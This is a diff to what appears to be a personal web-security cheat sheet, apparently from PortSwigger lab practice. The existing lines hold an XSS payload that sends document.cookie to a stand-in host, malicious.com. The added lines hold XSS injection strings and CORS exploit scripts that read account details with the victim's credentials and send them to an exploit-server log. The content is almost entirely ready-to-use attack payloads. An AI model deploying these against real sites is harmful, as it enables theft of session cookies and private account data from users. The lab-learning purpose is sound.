@@ -200,6 +200,12 @@ XSS:
 	<script>document.location=“http://malicious.com/steal.php?cookie=“
 	+document.cookie</script>
 	
+	- html encoded - "onmouseover="alert(1)
+	
+	- inside html tag "><svg onload=alert(1)>
+	
+	- inside href - javascript:alert(1)
+	
 CORS:
 	- var xhr = new XMLHttpRequest();
 	xhr.onload = function() {
@@ -224,3 +230,22 @@ CORS:
 	</script>
 	
 	- Access-Control-Allow-Origin: *
+	
+	-Origin: https://example.com 
+	<script>
+	    var req = new XMLHttpRequest();
+	    req.onload = reqListener;
+	    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+	    req.withCredentials = true;
+	    req.send();
+
+	    function reqListener() {
+		location='/log?key='+this.responseText;
+	    };
+	</script>
+	
+	- <script>
+	    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; 
+	    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();
+	    function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+	</script>
